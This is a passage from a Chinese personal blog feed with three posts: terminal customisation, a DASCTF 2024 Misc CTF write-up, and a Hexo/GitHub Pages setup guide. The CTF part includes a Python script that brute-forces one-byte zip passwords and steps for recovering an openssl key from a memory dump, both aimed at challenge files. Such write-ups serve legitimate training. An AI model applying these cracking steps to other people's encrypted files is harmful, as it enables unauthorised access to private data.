                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009105545990.png"
                        alt="image-20241009105545990"
                 ></p>
<p>右键安装后在PowerShell中打开设置</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009105635329.png"
                        alt="image-20241009105635329"
                 ></p>
<p>找到PowerShell的外观设置，<strong>这里还能进行背景图，透明度等相关设置</strong></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110113349.png"
                        alt="image-20241009110113349"
                 ></p>
<p>选择JetBrainsMono Nerd Font Mono字体并保存</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110129639.png"
                        alt="image-20241009110129639"
                 ></p>
<h3 id="修改主题">修改主题</h3>
<p>找到oh-my-posh安装路径下的thems文件夹并打开，每一个json文件名都是一个主题，将需要的主题名复制填写到配置文件的对应位置即可。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110243978.png"
                        alt="image-20241009110243978"
                 ></p>
<h3 id="安装扩展">安装扩展</h3>
<h4 id="安装Git扩展">安装Git扩展</h4>
<p>posh-git 是一款专为 Windows 系统的 PowerShell 设计的 Git 扩展模块。它的主要目标是在 PowerShell 中提供更为友好、直观的 Git 命令行界面，通过整合 Git 相关的信息到命令提示符中，并提供方便快捷的键绑定，使得日常 Git 操作更为高效、直观。</p>
<p>安装</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> posh<span class="literal">-git</span> <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
<p>安装完成后，重启 PowerShell 并输入以下命令启用 posh-git：<code>Import-Module posh-git</code></p>
<p>不生效的话可以在前面的配置文件 <code>Microsoft.PowerShell_profile.ps1</code>中追加以下内容</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> posh<span class="literal">-git</span> <span class="comment"># 引入 posh-git</span></span><br></pre></td></tr></table></figure>
<h4 id="历史命令联想">历史命令联想</h4>
<p><code>oh-my-zsh</code> 有一个很便利的功能就是输入部分命令后、按 <code>↑</code> 或 <code>↓</code> 就可以联想历史的完整命令，其实在 <code>oh-my-posh</code> 中也能实现。</p>
<p>首先在 <code>PowerShell</code> 执行以下命令安装插件：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PowerShellGet <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Install-Module</span> PSReadLine <span class="literal">-AllowPrerelease</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
<p>然后修改前面的配置文件 <code>Microsoft.PowerShell_profile.ps1</code>，在末尾追加以下内容：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> PSReadLine <span class="comment"># 历史命令联想</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置预测文本来源为历史记录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span> </span><br><span class="line"><span class="comment"># 设置 Tab 为菜单补全和 Intellisense </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> <span class="string">&quot;Tab&quot;</span> <span class="literal">-Function</span> MenuComplete </span><br><span class="line"><span class="comment"># 每次回溯输入历史，光标定位于输入内容末尾 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-HistorySearchCursorMovesToEnd</span> </span><br><span class="line"><span class="comment"># 设置向上键为后向搜索历史记录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward </span><br><span class="line"><span class="comment"># 设置向下键为前向搜索历史纪录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br></pre></td></tr></table></figure>
<h4 id="卸载">卸载</h4>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Uninstall-Module</span> <span class="built_in">oh</span><span class="literal">-my-posh</span> <span class="literal">-AllVersions</span></span><br></pre></td></tr></table></figure>
<h2 id="Windows-CMD">Windows-CMD</h2>
<p>使用clink + oh-my-posh进行美化，效果如图</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110926127.png"
                        alt="image-20241009110926127"
                 ></p>
<p>首先，安装<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fgithub.com%2Fchrisant996%2Fclink%2Freleases&amp;source=article&amp;objectId=2442201" >clink<i class="fas fa-external-link-alt"></i></a>，下载exe安装包即可，然后进入 <code>clink</code> 安装目录，创建 <code>oh-my-posh.lua</code> 文件，添加如下内容：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load(io.popen(<span class="string">&#x27;oh-my-posh init cmd&#x27;</span>):read(<span class="string">&quot;*a&quot;</span>))()</span><br></pre></td></tr></table></figure>
<p>如果使用的是自定义主题，则添加如下内容</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load(io.popen(<span class="string">&#x27;oh-my-posh init cmd --config C:\\Users\\&#123;你的用户名&#125;\\AppData\\Local\\Programs\\oh-my-posh\\themes\\montys.omp.json&#x27;</span>):read(<span class="string">&quot;*a&quot;</span>))()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
    <url>//post/DASCTF2407/</url>
    <content><![CDATA[<h3 id="png-master">png_master</h3>
<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
</ul>
<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
                        alt="Clip_2024-07-23_14-24-09"
                 ></p>
<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
                        alt="Clip_2024-07-23_14-34-41"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
                        alt="Clip_2024-07-23_14-35-03"
                 ></p>
<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
                        alt="500X500_2_3_8"
                 ></p>
<p>StegSlove中可以看到Alpha通道有东西</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
                        alt="Clip_2024-07-23_15-25-34"
                 ></p>
<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
                        alt="Clip_2024-07-23_15-26-38"
                 ></p>
<h3 id="EZ-zip">EZ_zip</h3>
<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
                        alt="Clip_2024-07-23_15-47-29"
                 ></p>
<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
                        alt="Clip_2024-07-23_15-58-20"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
                        alt="Clip_2024-07-23_16-00-23"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
                        alt="Clip_2024-07-23_16-00-36"
                 ></p>
<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
                        alt="Clip_2024-07-23_16-03-17"
                 ></p>
<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
                        alt="Clip_2024-07-23_16-04-42"
                 ></p>
<h3 id="ServerMeM">ServerMeM</h3>
<p>题面信息如下</p>
<blockquote>
<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
</blockquote>
<p>下载附件并解压得到：out.lime、System.map</p>
<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
<blockquote>
<p>strings mem | grep -i ‘Linux version’ | uniq</p>
</blockquote>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
                        alt="image-20240923181948954"
                 ></p>
<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
<h4 id="解法一">解法一</h4>
<p>Linux内核版本信息如下：</p>
<blockquote>
<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
</blockquote>
<h4 id="解法二">解法二</h4>
<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
                        alt="image-20240923182121568"
                 ></p>
<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
<p>还有openssl的具体版本：1.0.2k</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
                        alt="image-20240923182211807"
                 ></p>
<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
                        alt="11111111"
                 ></p>
<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
                        alt="image-20240923182320920"
                 ></p>
<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
<blockquote>
<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
<p>cd openssl-1.0.2k.tar.gz</p>
<p>./config --prefix=/usr/</p>
<p>make</p>
</blockquote>
<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
<blockquote>
<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
</blockquote>
<h3 id="ez-wav">ez_wav</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
                        alt="das240711"
                 ></p>
<p>打开key.grc</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
                        alt="das240712"
                 ></p>
<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
<blockquote>
<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
<p>下面的Vector Source提供的一个脉冲信号</p>
</blockquote>
<p>exp如下</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
                 ></p>
<p>010打开后得到密码 good_job</p>
<p>打开flag.grc</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
                 ></p>
<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
                 ></p>
<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
                 ></p>
<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
                 ></p>
<p>听flag即可</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Hexo和Github Page搭建静态博客</title>
    <url>//post/HexoBuild/</url>
    <content><![CDATA[<h4 id="一、安装准备">一、安装准备</h4>
<h5 id="1-Node-js和Git安装">1.Node.js和Git安装</h5>
<p>hexes博客依赖于Node.js和Git，故需要在本地先进行环境搭建。</p>
<p>·Node.js官网：<a class="link"   href="https://nodejs.org/zh-cn" >Node.js (nodejs.org)<i class="fas fa-external-link-alt"></i></a></p>
<p>·Git官网：<a class="link"   href="https://git-scm.com/downloads" >Git - Downloads (git-scm.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>完整以上程序的安装后，可以在cmd中输入：</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
<p>进行验证，若安装成功则会显示对应版本号。</p>
<h5 id="2-GIthub注册及仓库的创建">2.GIthub注册及仓库的创建</h5>
<p>完成github注册后，新建一个Repository，命名为：<a class="link"   href="http://xxx.github.io/" >xxx.github.io<i class="fas fa-external-link-alt"></i></a>，xxx为你的github用户名。</p>
<h4 id="二、链接至Github">二、链接至Github</h4>
<h5 id="1-设置GitHub邮箱">1.设置GitHub邮箱</h5>
<p>新建一个文件夹作为博客程序在本地的位置，在空白处右击选择Open Git Bash Here，开始设置GitHub账户的用户名和邮箱。</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;GitHub用户名&quot;</span><br><span class="line">git config --global user.email &quot;GitHub邮箱&quot;</span><br></pre></td></tr></table></figure>
<h5 id="2-创建SSH密匙">2.创建SSH密匙</h5>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;Github邮箱&quot;</span><br></pre></td></tr></table></figure>
<p>然后一路回车</p>
<p>进入 [C:\Users\用户名.ssh] 目录（要勾选显示“隐藏的项目”），用记事本打开公钥 id_rsa.pub 文件并复制里面的内容。</p>
<p>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。</p>
<p>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</p>
<p>注：可使用<code>ssh -T git@github.com</code>验证是否连接成功</p>
<h4 id="三、安装hexo">三、安装hexo</h4>
<h5 id="1-安装hexo程序">1.安装hexo程序</h5>
<p>在git中输入npm命令进行安装，在安装过程中没有任何提示，故耐心等待完成，如果国内网络环境不佳，可以跳转至文末更换npm源。</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<h5 id="2-初始化和本地部署">2.初始化和本地部署</h5>
<p>初始化和安装，<code>hexo init</code>的时候需要进行<code>git clone</code>，如果<code>git clone</code>在当地网络环境无法正常使用请跳转至文末设置本机代理 或 开启Clash的TUN模式。</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">hexo init		#初始化</span><br><span class="line">npm install		#安装相关组件</span><br></pre></td></tr></table></figure>
<p>启动本地服务器进行预览</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">hexo g		#渲染界面</span><br><span class="line">hexo s		#启动预览</span><br></pre></td></tr></table></figure>
<p>在运行的git窗口中访问<a class="link"   href="http://localhost:4000/" >http://localhost:4000/<i class="fas fa-external-link-alt"></i></a></p>
<p>就可以看到hexo的默认页面</p>
<p>注：如果页面加载错误可能是端口被占用，可使用命令：<code>hexo s -p 5000</code>进行修改</p>
<p>常用命令：</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">hexo new &quot;name&quot;       # 新建文章</span><br><span class="line">hexo new page &quot;name&quot;  # 新建页面</span><br><span class="line">hexo g                # 渲染页面</span><br><span class="line">hexo d                # 部署</span><br><span class="line">hexo g -d             # 生成页面并部署</span><br><span class="line">hexo s                # 本地预览</span><br><span class="line">hexo clean            # 清除缓存和已生成的静态文件</span><br><span class="line">hexo help             # 帮助</span><br></pre></td></tr></table></figure>
<h4 id="四、上传到Github">四、上传到Github</h4>
<h5 id="1-必要组件">1.必要组件</h5>
<p>首先需要安装deployer-git组件，在git窗口中：</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<h5 id="2-修改必要信息并上传">2.修改必要信息并上传</h5>
<p>在本地文件夹中修改_config.yml文件末尾的Deployment部分，如下</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: &#x27;https://github.com/用户名/用户名.github.io&#x27;</span><br><span class="line">  branch: main</span><br><span class="line">  #现版本的GitHub仓库默认main分支，如果定义为master也可在GitHub中修改默认选项</span><br></pre></td></tr></table></figure>
<p>修改保存后在git窗口中运行</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">hexo d		#推到github</span><br></pre></td></tr></table></figure>
<p>完成后即可访问：<a class="link"   href="https://xn--eqr924avxo.github.io/" >https://用户名.github.io<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="五、阿里云图床配置">五、阿里云图床配置</h4>
<h5 id="1-购买并配置阿里云OSS">1.购买并配置阿里云OSS</h5>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706956646891.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706956646891.png"
                        alt="1706956646891"
                 ></a></p>
<p>创建Bucket时，选择离自己最近的地域，读写权限一定要开启公共读，否则将无法访问</p>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706956819030.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706956819030.png"
                        alt="1706956819030"
                 ></a></p>
<p>在资源包管理界面购买合适的资源包</p>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240203184157330.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240203184157330.png"
                        alt="image-20240203184157330"
                 ></a></p>
<p>点击头像中的访问控制，找到左侧”用户“，点选创建用户，在创建用户时一定要在访问方式中<strong>打开OpenAPI调用访问</strong></p>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706956991492.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706956991492.png"
                        alt="1706956991492"
                 ></a></p>
<p>随后在用户管理界面右侧点击添加权限，授权<code>AliyunOSSFullAccess</code>后退出，在用户界面创建AccessKey并记录AccessKey和AccessSceret，这两个东西只会生成一次，所以一定要记录下来，如果没有记录只能禁用后重新生成</p>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706957282210.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706957282210.png"
                        alt="1706957282210"
                 ></a></p>
<p>在Bucket管理界面新增文件夹img</p>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240203184645964.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240203184645964.png"
                        alt="image-20240203184645964"
                 ></a></p>
<h5 id="2-Typora-PicGo实现自动上传">2.Typora+PicGo实现自动上传</h5>
<p>打开Typora，点选左上角 文件 - 偏好设置 并按照下图设置，设置完成后点击下载或更新</p>
<p><a href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240203185042334.png"><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240203185042334.png"
                        alt="image-20240203185042334"
                 ></a></p>
<p>下载完成后打开配置文件，将配置文件按照以下形式修改</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的AccessKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的AccessSecret&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的Bucket名&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;阿里云地域名&quot;</span><span class="punctuation">,</span> <span class="comment">//只需要地域名，如oss-cn-hangzhou</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span><span class="punctuation">,</span> <span class="comment">//路径</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span 